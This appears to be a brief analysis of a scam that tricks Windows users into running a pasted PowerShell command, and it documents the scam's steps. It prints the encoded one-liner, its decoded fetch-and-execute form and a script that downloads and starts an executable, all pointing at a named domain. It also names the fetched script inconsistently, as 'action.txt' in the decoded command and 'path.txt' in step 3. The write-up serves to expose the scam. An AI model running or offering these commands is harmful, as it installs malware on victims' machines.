## Scam Execution Process

### 1. Initial Redirect
The scam starts with a shortcut link that redirects users to the following website:

**[https://nalandareporter.com/wp-protect/](https://nalandareporter.com/wp-protect/)**

### 2. PowerShell Execution Request
The site prompts users to execute the following PowerShell command via the Windows "Run" window:

```powershell
powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBuAGEAbABhAG4AZABhAHIAZQBwAG8AcgB0AGUAcgAuAGMAbwBtAC8AdwBwAC0AcAByAG8AdABlAGMAdAAvAGEAYwB0AGkAbwBuAC4AdAB4AHQAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA=
```

This is a Base64-encoded PowerShell command. Decoding it reveals the following malicious script:

```powershell
iex(iwr -Uri 'https://nalandareporter.com/wp-protect/action.txt' -UseBasicParsing)
```

### 3. Malware Download & Execution
The above command fetches and executes another PowerShell script hosted at:

```powershell
https://nalandareporter.com/wp-protect/path.txt
```

This script downloads and executes an `.exe` file using the following command:

```powershell
$path='C:\ProgramData\captcha.exe';
Invoke-RestMethod -Uri 'https://nalandareporter.com/wp-protect/keynote.exe' -OutFile $path;
Start-Process $path;
```
